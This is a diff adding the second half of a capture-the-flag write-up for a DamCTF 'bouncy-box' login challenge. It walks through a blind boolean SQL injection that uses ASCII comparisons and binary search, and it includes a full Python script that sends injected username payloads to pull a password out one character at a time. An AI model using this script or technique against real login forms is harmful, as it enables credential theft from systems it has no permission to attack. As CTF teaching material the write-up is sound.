@@ -83,3 +83,75 @@ Let's back to the previous login panel and script the process.
 
 Basically I'll use [ASCII](https://www.w3schools.com/sql/func_sqlserver_ascii.asp) function in SQL && The ASCII Values for the printables characters which is from 32 to 128
 
+So let's create new Python script with 2 functions
+The first function(sqli) Responsible for communicating with the server to send payloads
+
+```py
+import requests #importing requests library
+host="https://bouncy-box.chals.damctf.xyz/login" #challange server
+
+def sqli():
+    data = {
+        "username":"payload",
+        "password":"a",
+        "score":0
+    }
+    r = requests.post(host, json=data)
+    print(data, r.text)    
+    
+```
+So now we will write the algorithm in get_char function.
+
+```py
+def get_char(pos):
+    lo, hi = 32, 128 # the ASCII values for printables
+    while lo <= hi: #calculating the first mid
+        mid = lo + (hi - lo) // 2 # the formula i've explanied before
+        if sqli(pos, mid): 
+            lo = mid + 1
+        else:
+            hi = mid - 1
+    return chr(lo)
+```
+In the last step, I must loop all characters, send the character and write the payload.
+The final script:
+```py
+import requests
+host="https://bouncy-box.chals.damctf.xyz/login"
+
+def sqli(pos,mid):
+    data = {
+        "username":"boxy_mcbounce' AND ascii(substr(password,%i,1))>%i -- -" % (pos,mid),
+        "password":"a",
+        "score":0
+    }
+    r = requests.post(host, json=data)
+    print(data, r.text)
+    return "Logging you" in r.text
+
+def get_char(pos):
+    lo, hi = 32, 128
+    while lo <= hi:
+        mid = lo + (hi - lo) // 2
+        if sqli(pos, mid):
+            lo = mid + 1
+        else:
+            hi = mid - 1
+    return chr(lo)
+
+flag = ''
+for i in range(1, 15):
+    flag += get_char(i)
+    print(flag)
+```
+####Final Result
+
+![Challfinal](/assets/img/Challfinal.png){: .mx-auto.d-block :}
+
+We have optimized the SQL injection process in time and resources
+
+We extract 12 character from the database in 1 min with just 84 request.
+
+![Challfinal2](/assets/img/Challfinal2.png){: .mx-auto.d-block :}
+
+Thanks for reading.
